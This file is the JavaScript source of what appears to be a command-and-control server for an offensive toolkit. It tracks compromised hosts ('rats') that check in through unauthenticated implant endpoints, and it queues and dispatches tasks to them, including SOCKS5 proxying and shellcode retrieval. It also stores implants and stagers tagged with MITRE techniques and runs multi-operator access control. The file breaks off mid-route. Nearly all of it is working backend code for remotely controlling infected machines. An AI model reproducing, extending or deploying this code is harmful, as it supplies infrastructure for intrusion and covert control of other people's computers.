import fs from "fs"
import stream from "stream"
import path from 'path'
import { randomBytes } from 'crypto'
import { spawn } from 'child_process'
const __dirname = path.resolve()
import * as dotenv from 'dotenv'
dotenv.config()
import Fastify from 'fastify'
import fastify_oas from 'fastify-oas'
import fastify_cookie from 'fastify-cookie'
import fastify_io from 'fastify-socket.io'
const fastify = Fastify({
  logger: false,
  bodyLimit: 19922944,
  maxParamLength: 500
})

//read .env file for API_KEY entry
const API_KEY = process.env.API_KEY
const SOCKET_KEY = process.env.SOCKET_KEY

//authentication hook
fastify.addHook('preHandler', (req, reply, done) => {
  if(req.url.includes('documentation')){
    done()
  }else if (req.url.includes('get_task') || req.url.includes('task_io') || (req.url.includes('/api/shellcode/') && req.method === 'GET')) {
    //implant-facing endpoints — no auth required
    done()
  }else{
    //check for auth cookie — env API_KEY (bootstrap admin) or a per-user key from the db
    const auth_cookie = req.cookies.auth
    if (auth_cookie === API_KEY) {
      req.currentUser = { isAdmin: true }
      done()
    } else {
      const user = db.prepare(`SELECT id, username FROM users WHERE api_key = ?`).get(auth_cookie)
      if (user) {
        req.currentUser = { isAdmin: false, id: user.id, username: user.username }
        done()
      } else {
        reply.code(401).send('Not Authorized')
        done()
      }
    }
  }
})

//need to allow connections from other frontend domains. Needs auth anyway
import fastify_cors from 'fastify-cors'
fastify.register(fastify_cors, {
  origin: '*'
})

//add a wildcard type handler for all unsupported types
fastify.addContentTypeParser('*', function (req, payload, done) {
  var data = ''
  payload.on('data', chunk => { data += chunk })
  payload.on('end', () => {
    done(null, data)
  })
})

fastify.register(fastify_io, {
  "cors": {
    "origin": "*"
  }
})
fastify.register(fastify_cookie)

//expose socket.io as a global so we can use it in the task handlers etc.
global.io = async function (event_name, event_data) {
  if (event_name === 'task_complete') {
    const t       = event_data
    const rat_imp = db.prepare(`SELECT imp_id FROM rats WHERE id = ?`).get(t.rat_id)
    log_event('TASK_COMPLETE',
      `${t.display || t.id} completed`,
      t.rat_id,
      rat_imp?.imp_id ?? null,
      { task_id: t.id, output_preview: (t.output || '').substring(0, 300) }
    )
  }
  fastify.io.emit(event_name, event_data)
}

// Import Swagger Options
import swagger from './swagger.js'

// Engagement logger
import { init_logger, log_event } from './logger.js'

// Register Swagger
//New Open API Standard
fastify.register(fastify_oas, swagger)

//database setup
import Database from 'better-sqlite3'
global.db = new Database('./db/nest.db', { verbose: console.log })

//create stations table
let station_setup = db.prepare(`
  CREATE TABLE IF NOT EXISTS stations (
    id TEXT PRIMARY KEY,
    name TEXT,
    language TEXT,
    code TEXT
  )
`)
station_setup.run()

//create implants table
let implant_setup = db.prepare(`
  CREATE TABLE IF NOT EXISTS implants (
    id TEXT PRIMARY KEY,
    notes TEXT,
    code TEXT,
    language TEXT,
    task_type TEXT
  )
`)
implant_setup.run()

//create stagers table
let stager_setup = db.prepare(`
  CREATE TABLE IF NOT EXISTS stagers (
    id TEXT PRIMARY KEY,
    code TEXT,
    implant_name TEXT,
    stager_name TEXT,
    file_type TEXT
    )
`)
stager_setup.run()

//creat rats table
let rat_setup = db.prepare(`
  CREATE TABLE IF NOT EXISTS rats (
    id TEXT PRIMARY KEY,
    imp_id TEXT,
    domain TEXT,
    host TEXT,
    user TEXT,
    first_seen INTEGER,
    last_seen INTEGER
  )
`)
rat_setup.run()

//create tasks table
let task_setup = db.prepare(`
  CREATE TABLE IF NOT EXISTS tasks (
    id TEXT PRIMARY KEY,
    rat_id TEXT,
    module_id TEXT,
    task_handler TEXT,
    parameters TEXT,
    display TEXT,
    output TEXT,
    scheduled_at INTEGER,
    retrieved_at INTEGER,
    completed_at INTEGER
  )
`)
task_setup.run()

//set up modules table
let modules_setup = db.prepare(`
  CREATE TABLE IF NOT EXISTS modules (
    id TEXT PRIMARY KEY,
    directory TEXT,
    title TEXT,
    task_type TEXT,
    task_handler TEXT,
    description TEXT,
    parameters TEXT,
    author TEXT
  )`)
modules_setup.run()

// Ensure directory is unique — deduplicate any existing rows, keeping the first inserted per directory
db.prepare(`DELETE FROM modules WHERE rowid NOT IN (SELECT MIN(rowid) FROM modules GROUP BY directory)`).run()
db.prepare(`CREATE UNIQUE INDEX IF NOT EXISTS modules_directory_unique ON modules(directory)`).run()

//set up components table. Task_Type is just for execution components but having a dedicated field makes searching simple
let components_setup = db.prepare(`
  CREATE TABLE IF NOT EXISTS components (
    id TEXT PRIMARY KEY,
    language TEXT,
    task_type TEXT,
    directory TEXT,
    title TEXT,
    description TEXT,
    author TEXT,
    parameters TEXT,
    component_type TEXT,
    component_handler TEXT,
    mitre TEXT,
    reference_links TEXT
  )`)
components_setup.run()

//set up stager_components table
let stager_components_setup = db.prepare(`
  CREATE TABLE IF NOT EXISTS stager_components (
    id TEXT PRIMARY KEY,
    directory TEXT,
    title TEXT,
    file_type TEXT,
    payload_type TEXT,
    author TEXT,
    description TEXT,
    parameters TEXT,
    stager_component_handler TEXT,
    mitre TEXT,
    reference_links TEXT
  )`)
stager_components_setup.run()

// Users table — one row per operator, each with their own api_key
db.prepare(`
  CREATE TABLE IF NOT EXISTS users (
    id       TEXT PRIMARY KEY,
    username TEXT UNIQUE NOT NULL,
    api_key  TEXT UNIQUE NOT NULL
  )
`).run()

// Maps users to the implant IDs they are allowed to see
db.prepare(`
  CREATE TABLE IF NOT EXISTS user_implants (
    user_id TEXT NOT NULL,
    imp_id  TEXT NOT NULL,
    PRIMARY KEY (user_id, imp_id)
  )
`).run()

// Initialise engagement logger (creates logs table if absent)
init_logger()

// ── Access control helpers ────────────────────────────────────────────────────

function userImplantIds(userId) {
  return db.prepare(`SELECT imp_id FROM user_implants WHERE user_id = ?`)
    .all(userId).map(r => r.imp_id)
}

function canAccessRat(currentUser, ratId) {
  if (currentUser.isAdmin) return true
  const rat = db.prepare(`SELECT imp_id FROM rats WHERE id = ?`).get(ratId)
  if (!rat) return false
  return !!db.prepare(`SELECT 1 FROM user_implants WHERE user_id = ? AND imp_id = ?`)
    .get(currentUser.id, rat.imp_id)
}

// Load modules
let _modules_loading = false
const load_modules = async () => {
  if (_modules_loading) return
  _modules_loading = true
  try {
    //list folders in the modules folder
    let modules_dir = path.join(__dirname, 'code_snippets/modules')
    let task_types = fs.readdirSync(modules_dir)
    for (const task_type of task_types) {
      let task_type_dir = path.join(modules_dir, task_type)
      //list subfolders in the task type folder
      let task_type_modules = fs.readdirSync(task_type_dir)
      for (const module of task_type_modules) {
        let module_dir = path.join(task_type_dir, module)
        //import the module manifest
        let manifest_path = path.join(module_dir, 'manifest.js')
        let task_hander_path = path.join(module_dir, 'TaskHandler.js')
        console.log(`${manifest_path}`)
        let { manifest } = await import(manifest_path)
        let module_id = Math.random().toString(36).slice(2).substring(0, 6)
        // INSERT OR IGNORE: no-op if directory already exists (UNIQUE constraint)
        db.prepare(`
          INSERT OR IGNORE INTO modules
            (id, directory, title, task_type, task_handler, description, parameters, author)
          VALUES
            ($id, $directory, $title, $task_type, $task_handler, $description, $parameters, $author)
        `).run({
          id: module_id,
          directory: module,
          title: manifest.title,
          task_type: manifest.task_type,
          task_handler: task_hander_path,
          description: manifest.description,
          parameters: JSON.stringify(manifest.parameters),
          author: manifest.author
        })
        // Always update the task_handler path in case the server path has changed
        db.prepare(`UPDATE modules SET task_handler = $task_handler WHERE directory = $directory`)
          .run({ task_handler: task_hander_path, directory: module })
      }
    }
  } finally {
    _modules_loading = false
  }
}

//Load components
const load_components = async () => {
  //list folders in the components folder
  let components_dir = path.join(__dirname, 'code_snippets/implants_and_stations')
  let languages = fs.readdirSync(components_dir)
  for (const language of languages) {
    let language_dir = path.join(components_dir, language)
    //list subfolders in the language folder
    let component_types = fs.readdirSync(language_dir)
    for (const component_type of component_types) {
      let component_type_dir = path.join(language_dir, component_type)
      //execution has task types depending on what types of instructions they can process. You can have multiple implementations for a particular task type.
      if (component_type == 'execution') {
        let task_types = fs.readdirSync(component_type_dir)
        for (const task_type of task_types) {
          let task_type_dir = path.join(component_type_dir, task_type)
          //list subfolders in the component type folder
          let components = fs.readdirSync(task_type_dir)
          for (const component of components) {
            let component_dir = path.join(task_type_dir, component)
            //import the component manifest
            let manifest_path = path.join(task_type_dir, 'manifest.js')
            console.log(`${manifest_path}`)
            let { manifest } = await import(manifest_path)
            let component_handler_path = path.join(task_type_dir, 'ComponentHandler.js')
            //check if the component is already in the database
            let component_check = db.prepare(`SELECT * FROM components WHERE component_handler = $component_handler`)
            let component_check_result = component_check.get({ component_handler: component_handler_path })
            if (!component_check_result) {
              let component_id = Math.random().toString(36).slice(2).substring(0, 6)
              //add the component to the database
              let component_insert = db.prepare(`
              INSERT INTO components
                (id, language, task_type, directory, title, description, author, parameters, component_type, component_handler, mitre, reference_links)
              VALUES
                ($id, $language, $task_type, $directory, $title, $description, $author, $parameters, $component_type, $component_handler, $mitre, $reference_links)
              `)
              component_insert.run({
                id: component_id,
                language: language,
                task_type: task_type,
                directory: component,
                title: manifest.title,
                description: manifest.description,
                author: manifest.author,
                parameters: JSON.stringify(manifest.parameters),
                component_type: component_type,
                component_handler: component_handler_path,
                mitre: JSON.stringify(manifest.mitre),
                reference_links: JSON.stringify(manifest.references)
              })
            }
          }
        }
      } else {
        //list subfolders in the component type folder
        let components = fs.readdirSync(component_type_dir)
        for (const component of components) {
          let component_dir = path.join(component_type_dir, component)
          //import the component manifest
          let manifest_path = path.join(component_dir, 'manifest.js')
          console.log(`${manifest_path}`)
          let { manifest } = await import(manifest_path)
          let component_handler_path = path.join(component_dir, 'ComponentHandler.js')
          //check if the component is already in the database
          let component_check = db.prepare(`SELECT * FROM components WHERE component_handler = $component_handler`)
          let component_check_result = component_check.get({ component_handler: component_handler_path })
          if (!component_check_result) {
            let component_id = Math.random().toString(36).slice(2).substring(0, 6)
            //add the component to the database
            let component_insert = db.prepare(`
            INSERT INTO components
              (id, language, task_type, directory, title, description, author, parameters, component_type, component_handler, mitre, reference_links)
            VALUES
              ($id, $language, $task_type, $directory, $title, $description, $author, $parameters, $component_type, $component_handler, $mitre, $reference_links)
          `)
            component_insert.run({
              id: component_id,
              language: language,
              task_type: '',
              directory: component,
              title: manifest.title,
              description: manifest.description,
              author: manifest.author,
              parameters: JSON.stringify(manifest.parameters),
              component_type: component_type,
              component_handler: component_handler_path,
              mitre: JSON.stringify(manifest.mitre),
              reference_links: JSON.stringify(manifest.references)
            })
          }
        }
      }
    }
  }
}

//load stager components
const load_stager_components = async () => {
  //list folders in the stager components folder
  let stager_components_dir = path.join(__dirname, 'code_snippets/stagers')
  let stager_components_payload_types = fs.readdirSync(stager_components_dir)
  for (const payload_type of stager_components_payload_types) {
    let payload_type_dir = path.join(stager_components_dir, payload_type)
    //list subfolders in the payload type folder
    let stager_file_types = fs.readdirSync(payload_type_dir)
    for (const stager_file_type of stager_file_types) {
      let stager_file_type_dir = path.join(payload_type_dir, stager_file_type)
      //list subfolders in the stager file type folder
      let stager_components = fs.readdirSync(stager_file_type_dir)
      for (const stager_component of stager_components) {
        let stager_component_dir = path.join(stager_file_type_dir, stager_component)  
        //import the stager component manifest
        let manifest_path = path.join(stager_component_dir, 'manifest.js')
        console.log(`${manifest_path}`)
        let { manifest } = await import(manifest_path)
        let stager_component_handler_path = path.join(stager_component_dir, 'StagerHandler.js')
        //check if the stager component is already in the database
        let stager_component_check = db.prepare(`SELECT * FROM stager_components WHERE stager_component_handler = $stager_component_handler`)
        let stager_component_check_result = stager_component_check.get({ stager_component_handler: stager_component_handler_path })
        if (!stager_component_check_result) {
          let stager_component_id = Math.random().toString(36).slice(2).substring(0, 6)
          //add the stager component to the database
          let stager_component_insert = db.prepare(`
          INSERT INTO stager_components
            (id, directory, payload_type, file_type, title, description, author, parameters, stager_component_handler, mitre, reference_links)
          VALUES
            ($id, $directory, $payload_type, $file_type, $title, $description, $author, $parameters, $stager_component_handler, $mitre, $reference_links)
          `)
          stager_component_insert.run({
            id: stager_component_id,
            directory: stager_component,
            payload_type: manifest.payload_type,
            file_type: manifest.file_type,
            title: manifest.title,
            description: manifest.description,
            author: manifest.author,
            parameters: JSON.stringify(manifest.parameters),
            stager_component_handler: stager_component_handler_path,
            mitre: JSON.stringify(manifest.mitre),
            reference_links: JSON.stringify(manifest.references)
          })
        }
      }
    } 
  }
}

//load modules on startup
load_modules()

//load components on startup
load_components()

//load stager components on startup
load_stager_components()

//Create object to store active implant handlers
global.active_implant_handlers = {}

//API route to add a new station
fastify.route({
  method: 'POST',
  url: '/api/station/save',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Save a Station',
    tags: ['Stations'],
    summary: 'Save Station Code',
    body: {
      type: 'object',
      properties: {
        name: { type: 'string' },
        language: { type: 'string' },
        code: { type: 'string' },
      }
    }
  },
  handler: async (request, reply) => {
    let { name, language, code } = request.body
    let station_id = Math.random().toString(36).slice(2).substring(0, 6)
    let station_insert = db.prepare(`
      INSERT INTO stations
        (id, name, language, code)
      VALUES
        ($id, $name, $language, $code)
    `)
    station_insert.run({id: station_id, name: name, language: language, code: code})
    reply.send({
      success: true,
      message: 'Station added successfully',
      station_id: station_id
    })
  }
})

//API route to list stations
fastify.route({
  method: 'GET',
  url: '/api/stations',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Get a list of Stations',
    tags: ['Stations'],
    summary: 'Get a list of Stations',
    response: {
      200: {
        description: 'Successful response',
        type: 'array'
      }
    }
  },
  handler: async (request, reply) => {
    let stations = db.prepare(`SELECT * FROM stations`).all()
    reply.send(stations)
  } 
})

fastify.route({
  method: ['GET'],
  url: '/api/rats',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Get a list of active RATs',
    tags: ['Rat'],
    summary: 'get a list of active RATs',
    response: {
      200: {
        description: 'Successful response',
        type: 'array'
      }
    }
  },
  handler: async function (req, reply) {
    let rats
    if (req.currentUser.isAdmin) {
      rats = db.prepare(`SELECT * FROM rats`).all()
    } else {
      const ids = userImplantIds(req.currentUser.id)
      if (ids.length === 0) { reply.send([]); return }
      rats = db.prepare(`SELECT * FROM rats WHERE imp_id IN (${ids.map(() => '?').join(',')})`).all(...ids)
    }
    reply.type('application/json').send(rats)
  }
})

fastify.route({
  method: ['DELETE'],
  url: '/api/rats/:rat_id',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Delete a RAT and its tasks',
    tags: ['Rat'],
    summary: 'delete a RAT by id',
  },
  handler: async function (req, reply) {
    const rat_id = req.params.rat_id
    if (!canAccessRat(req.currentUser, rat_id)) { reply.code(403).send('Forbidden'); return }
    const dying  = db.prepare(`SELECT user, host, imp_id FROM rats WHERE id = ?`).get(rat_id)
    log_event('RAT_KILLED', `Rat removed: ${dying?.user || '?'}@${dying?.host || '?'}`, rat_id, dying?.imp_id ?? null, { rat_id })
    db.prepare(`DELETE FROM tasks WHERE rat_id = $rat_id`).run({ rat_id })
    db.prepare(`DELETE FROM rats  WHERE id      = $rat_id`).run({ rat_id })
    reply.type('text/plain').send('ok')
  }
})

//API to get a list of rats based on searching the output of their associated tasks
fastify.route({
  method: ['GET'],
  url: '/api/rats/search',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Get a list of active RATs based on searching the output of their associated tasks',
    tags: ['Rat'],
    summary: 'get a list of active RATs based on searching the output of their associated tasks',
    querystring: {
      type: 'object',
      properties: {
        search: { type: 'string' }
      }
    },
    response: {
      200: {
        description: 'Successful response',
        type: 'array'
      }
    }
  },
  handler: async function (req, reply) {
    let rats
    const term = '%' + req.query.search + '%'
    if (req.currentUser.isAdmin) {
      rats = db.prepare(`SELECT DISTINCT rats.* FROM rats INNER JOIN tasks ON rats.id = tasks.rat_id WHERE tasks.output LIKE ?`).all(term)
    } else {
      const ids = userImplantIds(req.currentUser.id)
      if (ids.length === 0) { reply.send([]); return }
      rats = db.prepare(`SELECT DISTINCT rats.* FROM rats INNER JOIN tasks ON rats.id = tasks.rat_id WHERE tasks.output LIKE ? AND rats.imp_id IN (${ids.map(() => '?').join(',')})`).all(term, ...ids)
    }
    reply.type('application/json').send(rats)
  }
})

//API route to get info for a rat by id
fastify.route({
  method: ['GET'],
  url: '/api/rats/:rat_id/info',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Get info for a rat by id',
    tags: ['Rat'],
    summary: 'get info for a rat by id',
    params: {
      type: 'object',
      properties: {
        rat_id: { type: 'string' }
      }
    },
    response: {
      200: {
        description: 'Successful response',
        type: 'string'
      }
    }
  },
  handler: async function (req, reply) {
    const rat_id = req.params.rat_id
    if (!canAccessRat(req.currentUser, rat_id)) { reply.code(403).send('Forbidden'); return }
    let rat_info = await db.prepare(`SELECT rats.domain, rats.first_seen, rats.host, rats.user, implants.task_type, implants.notes FROM rats LEFT JOIN implants ON implants.id = rats.imp_id WHERE rats.id = ?`).get(rat_id)
    reply.type('application/json').send(JSON.stringify(rat_info || {}))
  }
})

fastify.route({
  method: ['POST'],
  url: '/api/tasks/get_task',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Get current task for a RAT',
    tags: ['Task'],
    summary: 'get the current task for a RAT',
    body: {
      type: 'object',
      properties: {
        rat_id: { type: 'string' },
        imp_id: { type: 'string' },
        user: { type: 'string' },
        host: { type: 'string' },
        domain: { type: 'string' }
      }
    },
    response: {
      200: {
        description: 'Successful response',
        type: 'string'
      }
    }
  },
  handler: async function (req, reply) {
    let { rat_id } = req.body

    // rat_id is base64(random:imp_id:user:host:domain) — decode it for registration fields
    let imp_id = '', user = '', host = '', domain = ''
    try {
      const parts = Buffer.from(rat_id, 'base64').toString('utf8').split(':')
      imp_id = parts[1] || ''
      user   = parts[2] || ''
      host   = parts[3] || ''
      domain = parts[4] || ''
    } catch (_) {}

    // Reject anything that doesn't decode to a valid implant registration
    if (!imp_id) { reply.type('text/plain').send(''); return }

    //Check if rat already exists
    let rat_check = db.prepare(`SELECT * FROM rats WHERE id = $rat_id`)
    let rat_check_result = rat_check.get({ rat_id })
    if (rat_check_result) {
      //Update last seen
      let rat_update = db.prepare(`UPDATE rats SET last_seen = $last_seen WHERE id = $rat_id`)
      fastify.io.emit('rat_update', { id: rat_id, last_seen: Date.now() })
      rat_update.run({ rat_id, last_seen: Date.now() })
      //Check if the rat has a task waiting
      let get_current_task = db.prepare(`SELECT id, task_handler, parameters FROM tasks WHERE completed_at=0 AND rat_id=$rat_id`)
      let current_task = get_current_task.get({ rat_id: rat_id })
      if (current_task != undefined) {
        let task_id = current_task.id
        current_task.rat_id = rat_id;
        //update task to retrieved
        let task_update = db.prepare(`UPDATE tasks SET retrieved_at = $retrieved_at WHERE id = $task_id`)
        task_update.run({ task_id: task_id, retrieved_at: Date.now() })
        //Pass execution to task handler
        let { TaskHandler } = await import(current_task.task_handler)
        active_implant_handlers[task_id] = new TaskHandler(current_task)
        active_implant_handlers[task_id].getTask(req, reply)
      } else {
        reply.type('text/plain').send('')
      }
    } else {
      //Create new rat in the DB
      let new_rat = db.prepare(`INSERT INTO rats (id, imp_id, domain, host, user, first_seen, last_seen) VALUES ($rat_id, $imp_id, $domain, $host, $user, $first_seen, $last_seen)`)
      let first_seen = new Date().getTime()
      let last_seen = first_seen
      new_rat.run({ rat_id, imp_id, domain, host, user, first_seen, last_seen })
      log_event('RAT_NEW', `New implant: ${user}@${host} (${domain})`, rat_id, imp_id, { imp_id, host, user, domain })
      //emit new_rat event
      fastify.io.emit('new_rat', { id: rat_id, imp_id: imp_id, domain: domain, host: host, user: user, first_seen: first_seen, last_seen: last_seen })
      reply.type('text/plain').send('')
    }
  }
})

//API route to get all tasks for a given rat
fastify.route({
  method: ['GET'],
  url: '/api/rats/:rat_id/tasks',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Get a list of all tasks for a given rat',
    tags: ['Task', 'Rat'],
    summary: 'get a list of all tasks for a given rat',
    response: {
      200: {
        description: 'Successful response',
        type: 'array'
      }
    }
  },
  handler: async function (req, reply) {
    const rat_id = req.params.rat_id
    if (!canAccessRat(req.currentUser, rat_id)) { reply.code(403).send('Forbidden'); return }
    let tasks = db.prepare(`SELECT * FROM tasks WHERE rat_id = $rat_id`).all({ rat_id })
    reply.type('application/json').send(tasks)
  }
})

fastify.route({
  method: ['POST'],
  url: '/api/rats/:rat_id/add_task',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Add a task for a RAT',
    tags: ['Rat', 'Task'],
    summary: 'schedule a task for a RAT',
    body: {
      type: 'object',
      properties: {
        module_id: { type: 'string' },
        parameters: { type: 'object' }
      }
    },
    response: {
      200: {
        description: 'Successful response',
        type: 'string'
      }
    }
  },
  handler: async function (req, reply) {
    const rat_id = req.params.rat_id
    if (!canAccessRat(req.currentUser, rat_id)) { reply.code(403).send('Forbidden'); return }
    let task_id = Math.random().toString(36).slice(2).substring(0, 6)
    let new_task = req.body
    //Get module task_handler by module id from the db
    let get_task_handler = db.prepare(`SELECT task_handler FROM modules WHERE id = $module_id`)
    let task_handler = get_task_handler.get({ module_id: new_task.module_id })
    let add_task = db.prepare(`
      INSERT INTO tasks (id, rat_id, module_id, task_handler, parameters, scheduled_at, retrieved_at, completed_at) 
      VALUES ($id, $rat_id, $module_id, $task_handler, $parameters, $scheduled_at, $retrieved_at, $completed_at)
  `)
    add_task.run({
      id: task_id,
      rat_id: rat_id,
      module_id: 'stub',
      task_handler: task_handler.task_handler,
      parameters: JSON.stringify(new_task.parameters),
      scheduled_at: Date.now(),
      retrieved_at: 0,
      completed_at: 0
    })
    const rat = db.prepare(`SELECT user, host, imp_id FROM rats WHERE id = ?`).get(rat_id)
    const mod = db.prepare(`SELECT title FROM modules WHERE id = ?`).get(new_task.module_id)
    log_event('TASK_QUEUED',
      `${mod?.title || 'task'} → ${rat?.user || '?'}@${rat?.host || '?'}`,
      rat_id,
      rat?.imp_id ?? null,
      { task_id, module: mod?.title, parameters: new_task.parameters }
    )
    reply.type('text/plain').send(JSON.stringify({ 'id': task_id }))
  }
})

fastify.route({
  method: ['POST'],
  url: '/api/tasks/:task_id/task_io',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Send a task output to the server, and potentially send additional data',
    tags: ['Task'],
    summary: 'Maintain IO for an active Task',
    response: {
      200: {
        description: 'Successful response',
        type: 'string'
      }
    }
  },
  handler: async function (req, reply) {
    let task_id = req.params.task_id;
    let task_handler = active_implant_handlers[task_id]
    if (task_handler) {
      task_handler.taskIO(req, reply)
    }
    else {
      reply.type('text/plain').send('')
    }
  }
})

//API route to stop a long-running task (SOCKS5 proxy, etc.)
fastify.route({
  method: ['POST'],
  url: '/api/tasks/:task_id/stop',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Signal a long-running task handler to stop',
    tags: ['Task'],
    summary: 'Stop a long-running task',
    response: { 200: { description: 'Successful response', type: 'string' } }
  },
  handler: async function (req, reply) {
    const task_id = req.params.task_id
    const handler = active_implant_handlers[task_id]
    if (handler && typeof handler.stop === 'function') {
      handler.stop()
      reply.type('text/plain').send('stopped')
    } else {
      const row = db.prepare(`SELECT retrieved_at, completed_at FROM tasks WHERE id = $task_id`).get({ task_id })
      if (row && !row.retrieved_at && !row.completed_at) {
        db.prepare(`UPDATE tasks SET completed_at = $now, output = 'cancelled' WHERE id = $task_id`)
          .run({ task_id, now: Date.now() })
        reply.type('text/plain').send('cancelled')
      } else {
        reply.code(404).type('text/plain').send('no active handler')
      }
    }
  }
})

//API route to search modules
fastify.route({
  method: ['GET'],
  url: '/api/search/modules',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Get a list of modules by task type, description, and title',
    tags: ['Module'],
    summary: 'get a list of modules by task type, description, and title',
    querystring: {
      type: 'object',
      properties: {
        task_type: { type: 'string' },
        description: { type: 'string' },
        title: { type: 'string' }
      }
    },
    response: {
      200: {
        description: 'Successful response',
        type: 'array',
        items: {
          type: 'object',
          properties: {
            title: { type: 'string' },
            task_hander_path: { type: 'string' },
            manifest_path: { type: 'string' }
          }
        }
      }
    }
  },
  handler: async function (req, reply) {
    let task_type = req.query.task_type || ''
    let description = req.query.description || ''
    let title = req.query.title || ''
    let get_modules = db.prepare(`SELECT id, directory, task_type, title, description FROM modules WHERE task_type LIKE $task_type AND description LIKE $description AND title LIKE $title`)
    let modules = get_modules.all({ task_type: `%${task_type}%`, description: `%${description}%`, title: `%${title}%` })
    reply.type('application/json').send(JSON.stringify(modules))
  }
})

//API route to search modules and return a single one for URL based task scheduling
fastify.route({
  method: ['GET'],
  url: '/api/exact_search/modules',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Get a module by task type, and directory',
    tags: ['Module'],
    summary: 'get a module by task type, and directory',
    querystring: {
      type: 'object',
      properties: {
        task_type: { type: 'string' },
        directory: { type: 'string' }
      }
    },
    response: {
      200: {
        description: 'Successful response',
        type: 'array',
        items: {
          type: 'object',
          properties: {
            title: { type: 'string' },
            task_hander_path: { type: 'string' },
            manifest_path: { type: 'string' }
          }
        }
      }
    }
  },
  handler: async function (req, reply) {
    let task_type = req.query.task_type || ''
    let directory = req.query.directory || ''
    let get_modules = db.prepare(`SELECT id, directory, title, description, author, parameters FROM modules WHERE task_type = $task_type AND directory = $directory`)
    let module = get_modules.get({ task_type: `${task_type}`, directory: `${directory}` })
    reply.type('application/json').send(JSON.stringify(module))
  }
})

//API route to get a module by id
fastify.route({
  method: ['GET'],
  url: '/api/modules/:module_id',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Get a module by id',
    tags: ['Module'],
    summary: 'get a module by id',
    params: {
      type: 'object',
      properties: {
        module_id: { type: 'string' }
      }
    },
    response: {
      200: {
        description: 'Successful response',
        type: 'object',
        properties: {
          title: { type: 'string' },
          description: { type: 'string' },
          author: { type: 'string' },
          parameters: { type: 'string' }
        }
      }
    }
  },
  handler: async function (req, reply) {
    let module_id = req.params.module_id
    let get_module = db.prepare(`SELECT id, title, description, author, parameters FROM modules WHERE id = $module_id`)
    let module = get_module.get({ module_id: module_id })
    reply.type('application/json').send(JSON.stringify(module))
  }
})

//API route to search components
fastify.route({
  method: ['GET'],

  url: '/api/search/components',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Get a list of components by language, component type, description, and title',
    tags: ['Component'],
    summary: 'get a list of components by language, component type, description, and title',
    querystring: {
      type: 'object',
      properties: {
        language: { type: 'string' },
        directory: { type: 'string' },
        task_type: { type: 'string' },
        component_type: { type: 'string' },
        description: { type: 'string' },
        title: { type: 'string' }
      }
    },
    response: {
      200: {
        description: 'Successful response',
        type: 'array',
        items: {
          type: 'object',
          properties: {
            directory: { type: 'string' },
            title: { type: 'string' },
            id: { type: 'string' },
            description: { type: 'string' }
          }
        }
      }
    }
  },
  handler: async function (req, reply) {
    let language = req.query.language || ''
    let directory = req.query.directory || ''
    let task_type= req.query.task_type || ''
    let component_type = req.query.component_type || ''
    let description = req.query.description || ''
    let title = req.query.title || ''
    let get_components = db.prepare(`SELECT id, directory, title, description, author, parameters FROM components WHERE language LIKE $language AND directory LIKE $directory AND task_type LIKE $task_type AND component_type = $component_type AND description LIKE $description AND title LIKE $title`)
    let components = get_components.all({ language: `%${language}%`, directory: `%${directory}%`, task_type: `%${task_type}%`, component_type: `${component_type}`, description: `%${description}%`, title: `%${title}%` })
    reply.type('application/json').send(JSON.stringify(components))
  }
})

//API route to search components for exact matches. Useful for returning single components for URL based builders
fastify.route({
  method: ['GET'],

  url: '/api/exact_search/components',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Get a component by language, component type, description, directory, task_type, and title',
    tags: ['Component'],
    summary: 'get a list of components by language, component type, description, and title',
    querystring: {
      type: 'object',
      properties: {
        language: { type: 'string' },
        directory: { type: 'string' },
        component_type: { type: 'string' }
      }
    },
    response: {
      200: {
        description: 'Successful response',
        type: 'array',
        items: {
          type: 'object',
          properties: {
            directory: { type: 'string' },
            title: { type: 'string' },
            id: { type: 'string' },
            description: { type: 'string' }
          }
        }
      }
    }
  },
  handler: async function (req, reply) {
    let language = req.query.language || ''
    let directory = req.query.directory || ''
    let component_type = req.query.component_type || ''
    let get_components = db.prepare(`SELECT id, directory, title, description, author, parameters FROM components WHERE language = $language AND directory = $directory AND component_type = $component_type`)
    let component = get_components.get({ language: `${language}`, directory: `${directory}`, component_type: `${component_type}`})
    reply.type('application/json').send(JSON.stringify(component))
  }
})

//API route to list available languages
fastify.route({
  method: ['GET'],
  url: '/api/list/languages',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Get a unique list of languages available by component type',
    tags: ['Component'],
    summary: 'get a list of languages, by component type to list starting points for station and implant builders',
    querystring: {
      type: 'object',
      properties: {
        component_type: { type: 'string' },
      }
    },
    response: {
      200: {
        description: 'Successful response',
        type: 'array',
        items: {
          type: 'string',
        }
      }
    }
  },
  handler: async function (req, reply) {
    let component_type = req.query.component_type || ''
    let get_components = db.prepare(`SELECT language FROM components WHERE component_type = $component_type`)
    let languages = get_components.pluck().all({ component_type: `${component_type}` })
    languages = [...new Set(languages)]
    reply.type('application/json').send(JSON.stringify(languages))
  }
})

//API route to list available languages
fastify.route({
  method: ['GET'],
  url: '/api/list/task_types',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Get a unique list of task types for a language',
    tags: ['Component','Task'],
    summary: 'get a list of task_type available for a particual language for implant builder',
    querystring: {
      type: 'object',
      properties: {
        language: { type: 'string' },
      }
    },
    response: {
      200: {
        description: 'Successful response',
        type: 'array',
        items: {
          type: 'string',
        }
      }
    }
  },
  handler: async function (req, reply) {
    let language = req.query.language || ''
    let get_components = db.prepare(`SELECT task_type FROM components WHERE language = $language AND component_type = 'execution'`)
    let task_types = get_components.pluck().all({ language: `${language}` })
    task_types = [...new Set(task_types)]
    reply.type('application/json').send(JSON.stringify(task_types))
  }
})

//API route to get a component by id
fastify.route({
  method: ['GET'],
  url: '/api/components/:component_id',
  schema: {
    security: [{ cookieAuth: [] }],
